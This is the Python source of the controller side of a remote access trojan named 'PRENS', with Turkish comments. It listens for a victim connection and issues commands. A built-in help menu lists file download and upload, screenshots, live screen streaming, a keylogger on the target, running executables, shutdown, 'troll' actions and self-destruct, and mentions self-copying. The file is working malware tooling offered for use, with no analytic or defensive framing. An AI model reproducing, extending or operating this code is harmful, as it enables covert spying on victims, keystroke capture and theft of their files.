import socket
import time
from colorama import Fore,Back,Style,init
import os
port=int(input("hangi portu dinlemek istiyorsunuz?:"))

init()

def prens():
  print("""
        
        
    -----/\\------        
        /  \\
       /----\\
      /      \\  
     /        \\

        """)


def shell():

  print(Fore.RESET+"""
  
========          ========            =========
KOMUTLAR          AÇIKLAMA              KULLANIMI
==============        ==============      ================
  
DOSYA İŞLEMLERİ  
    ---------------------------
    +touch:dosya oluşturur,  K:    touch dosyaadı.dosyauzantısı
    +rm:dosya kaldırır,      K:     rm    dosya.adı.dosyauzantısı
    +cd:dizin değiştirilmesini sağlar,  K: cd istenilen_dizin_ismi yada istenilen_dizin_yolu
    +back:üst dizine gider,  K:    back
    +cat:dosya okunmasını sağlar,  K: cat dosyaadı.dosyauzantısı
    +change:bir dosyanın üzerine yazar,  K:  (change dosyaadı.dosyauzantısı), (yazdır=kendi dizinindeki dosyaadı.dosyauzantısı)
    +ls:dizindeki dosyaları sıralar:,   K: ls
    +pwd:çalışılan dizini  gösterir, K: pwd
    

İZLEME VE KAYIT
    ------------------
%80 screenshot: ekran görüntüsü alır, K: screenshot dosyaadı.png NOT: bulunduğun dizindeki konuma ss alır DİKKAT!
%60 screenshare: ekranı izlemeye başlar, K: screenshare
    +stopscreen: ekran izlemeyi kapatır, K: stopscreen
    -startklog:karşı sistemde keylogger başlatır,  K: startklog
    -stopklog: keyloggerı durdurur,  K:stopklog
    
    
DOSYA YÜKLEME İNDİRME VE YÜRÜTME
      -------------------------
 %80  sniff:karşı sistemdeki dosyaları indirir, K:sniff dosyaadı.dosyauzantısı
 %80 send:karşı sisteme dosya gönder, K:send dosyaadı.dosyauzantısı
      -open:karşı sistemdeki istenilen yürütülebilir dosyayı açar, K:open dosyaadı.dosyauzantısı
      +url:web sitesi açar, K: url <url>
      
      
SES KOMUTLARI
  ------------------
  
  -sesfull:sesi fuller, K: sesfull
  -seskapat: sesi kapatır, K: seskapat
  -playsound: karşı sistemde ses çalıştırır, K:playsound dosyaadı.mp3     #PROTOTİP
  
  
  
TROLL  
  ---------------------
    +ekranı dondur:explorer exeyi öldürür, K:
    -mesaj:ekrana istenilen mesajı bırakır, K:mesaj merhaba bu bir deneme yazısı       #PROTOTİP
    -spam:masaüstünde dosya yada mesaj spamlar,K: 1=(spam mesaj deneme mesajı) 2=(spam dosya deneme.txt)   #PROTOTİP
    -background:arkaplanı değiştirir, K: background dosyaadı_dosyauzantısı   #PROTOTİP
    +kapat: bilgisayarı kapatır,K: kapat  
    NOT:bu komutlar sadece troll amaçlı değildir (:
  
  
SELF YIKIM :
  ---------------------

-ruin:kendini yok eder,  K: ruin      NOT:bu sadece kendini yok eder diğer kalan kalıntıları rm komutu ile el ile temizlemeniz lazım   #PROTOTİP
        
          """)



#dinleme--------------------------------------------------------
baglantı =socket.socket(socket.AF_INET,socket.SOCK_STREAM)
baglantı.bind(("0.0.0.0",port))
baglantı.listen(1)
prens()
print("sunucu dinlemede...")

client ,addr =baglantı.accept()
print(client,addr)

print("yardım için"+Fore.GREEN+" yardım "+Fore.RESET+"yazın")
#dinleme--------------------------------------------------------

print("shock eklentisi kalktı artık kod kendini kopyalar ve kendisi tek parça halinde kendini başlatır")

#cmd-----------------------------------------------------------
while True:
#gönderilen------------------------------------------------------

  client.send("terminal".encode("utf-8"))
  terminal=client.recv(65536).decode("utf-8")
       

  
  #burası başlangıç işleri=======================================
  
  emir=  input(Fore.RED+"PRENS>"+terminal+":")
  
  if not emir:
    continue
  
  if emir.startswith("yazdır"):
   
      dosya=emir.split()
      dosya=dosya[1]
      with open(dosya,"r") as file:
       içerik = file.read()       
      client.send("PRENSYAZDIR ".encode("utf-8")+içerik.encode("utf-8"))
      emir=""
       
  if emir=="yardım":
    shell()
  """
  if emir.startswith("cmd"):
    client.send(emir.encode("utf-8"))
    print(client.recv(16384))
    continue
  """
  if emir =="nerdeyim":
    dosyalar=os.listdir(".")
    print(dosyalar)
    client.send("nerdeyimben".encode("utf-8"))
    emir=""
    
    
  if emir=="screenshare":
    try: 
     from vidstream import StreamingServer
     screen=StreamingServer("0.0.0.0",9090) 
     screen.start_server()
    except Exception as e:
      print(e)
  
      
      
  if emir.startswith("send"):
    senddosya=emir.split()
    senddosya=senddosya[1]
    client.send(f"gonder {senddosya}".encode("utf-8"))
    print("dosya açıldı")
    with open(senddosya,"rb")as send:
      while chunk:=send.read(16384):
        client.send(chunk)  
        print("gönderme kısmı")
      client.send(b"EOF")
      print("gönderme bitti")
    


  client.send(emir.encode("utf-8"))
  
#gönderilen----------------------------------------------




#gelen--------------------------------------------------
  gelenveri=client.recv(16384).decode("utf-8")
  
  if emir == "ls":
        try:
            client.settimeout(1.0)
            while True:
                try:
                    ls_verisi = client.recv(16384) 
                    if not ls_verisi:
                        break  
                    print(ls_verisi.decode("utf-8"))  
                except socket.timeout:
                    print("Zaman aşımı, ls verisi gelmedi.")
                    break 
        except Exception as e:
            print(f"ls komutunda hata oluştu: {e}")
        finally:
            client.settimeout(None)
  if gelenveri=="izleme durduruldu":
    print(gelenveri)
    try:
      screen.stop_server()
    except Exception as e:
      print(e)
      

  if gelenveri.startswith("DOSYAGELDİ"):
    print("Dosya açılıyor.")
    filename = gelenveri.split()[1]

    try:
     
        client.settimeout(2.0)  

        with open(filename, "wb") as dosya:
            while True:
                try:
                    data = client.recv(16384) 
                    if not data or data == b"": 
                        print("Veri bitti.")
                        break
                    
                   
                    if data.startswith(b"EOF"):
                        print("Dosya transferi tamamlandı.")
                        dosya.close()
                        break

                    dosya.write(data)
                    print("Data yazılıyor...")
                
                except socket.timeout:
                    print("Zaman aşımı, veri gelmedi.")
                    dosya.close()
                    break
                except ConnectionResetError:
                    print("Bağlantı istemci tarafından kapatıldı.")
                    break
    except socket.timeout:
      break
        
        
    except Exception as e:
        print(f"Dosya kaydetme hatası: {e}")

    finally:
       
        client.settimeout(None)

    
    
    
  print(Fore.RESET+gelenveri)
#gelen-----------------------------------------------------------

#cmd-----------------------------------------------------------
